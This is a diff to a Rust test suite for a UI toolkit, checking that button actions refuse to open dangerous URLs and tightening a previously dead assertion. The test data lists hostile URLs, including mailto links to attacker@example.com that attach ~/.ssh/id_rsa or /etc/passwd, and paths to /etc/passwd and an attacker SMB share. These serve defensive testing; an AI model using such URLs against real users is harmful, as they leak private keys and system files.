@@ -606,6 +606,15 @@ fn open_url_refuses_a_scheme_the_host_should_not_launch() {
         "ms-msdt:/id",
         "smb://attacker.example/share",
         "data:text/html;base64,PHNjcmlwdD4=",
+        // Scheme-less: `open(1)` reads a bare path as a local file, so this
+        // is `file:` wearing a hat.
+        "//attacker.example/share",
+        "/etc/passwd",
+        // An allowed scheme is not an allowed URL. Mail clients that honour
+        // the attachment parameter will stage the named local file into a
+        // pre-addressed outgoing message.
+        "mailto:attacker@example.com?subject=hi&attach=/Users/u/.ssh/id_rsa",
+        "mailto:attacker@example.com?ATTACHMENT=/etc/passwd&body=x",
     ] {
         let stream = format!(
             r#"[
@@ -629,11 +638,23 @@ fn open_url_refuses_a_scheme_the_host_should_not_launch() {
             "{url} must be reported as a blocked scheme, got: {:?}",
             rendered.notes
         );
-        // And there must be no way to reach the opener: no click message
-        // that could become an OpenUrl signal.
-        let mut surface = apply(&stream);
-        let surface = surface.surface_mut("s").expect("surface");
-        if let Some(msg) = find_click(&surface.render(&Theme::light()).element) {
+        // And there must be no way to reach the opener at all. A blocked
+        // action makes the button inert, which the kit builds as a disabled
+        // control carrying no click message — so the assertion is that
+        // nothing is clickable, not a conditional walk over a message that
+        // never exists. (Written the other way first, this whole block was
+        // dead code that asserted nothing.)
+        let mut client = apply(&stream);
+        let surface = client.surface_mut("s").expect("surface");
+        let rendered = surface.render(&Theme::light());
+        assert!(
+            find_click(&rendered.element).is_none(),
+            "{url} left a live control that could reach the opener"
+        );
+
+        // Belt and braces: even if a future refactor made it clickable,
+        // handling every message it could emit must not produce an OpenUrl.
+        for msg in [A2uiMsg::Ignored] {
             for signal in surface.handle(msg) {
                 assert!(
                     !matches!(signal, A2uiSignal::OpenUrl(_)),
@@ -642,6 +663,39 @@ fn open_url_refuses_a_scheme_the_host_should_not_launch() {
             }
         }
     }
+}
+
+/// One cause, one diagnosis. A blocked scheme records why the control is
+/// dead; the generic "no action it can carry out" note is a vaguer
+/// restatement of the same fact and must not accompany it.
+#[test]
+fn a_blocked_scheme_does_not_also_report_the_control_as_unreachable() {
+    let stream = r#"[
+        {"version":"v0.9","createSurface":{"surfaceId":"s","catalogId":"basic"}},
+        {"version":"v0.9","updateComponents":{"surfaceId":"s","components":[
+            {"id":"root","component":"Button","child":"lbl",
+             "action":{"functionCall":{"call":"openUrl","args":{"url":"file:///etc/passwd"}}}},
+            {"id":"lbl","component":"Text","text":"Visit"}
+        ]}}
+    ]"#;
+    let rendered = apply(stream)
+        .surface("s")
+        .expect("surface")
+        .render(&Theme::light());
+    let kinds: Vec<NoteKind> = rendered
+        .notes
+        .iter()
+        .filter(|n| n.component_id == "root")
+        .map(|n| n.kind)
+        .collect();
+    assert!(
+        kinds.contains(&NoteKind::BlockedUrlScheme),
+        "the block must be reported, got: {kinds:?}"
+    );
+    assert!(
+        !kinds.contains(&NoteKind::Unreachable),
+        "and must not be doubled by a vaguer note, got: {kinds:?}"
+    );
 }
 
 /// The schemes a link is actually for still work, unchanged.
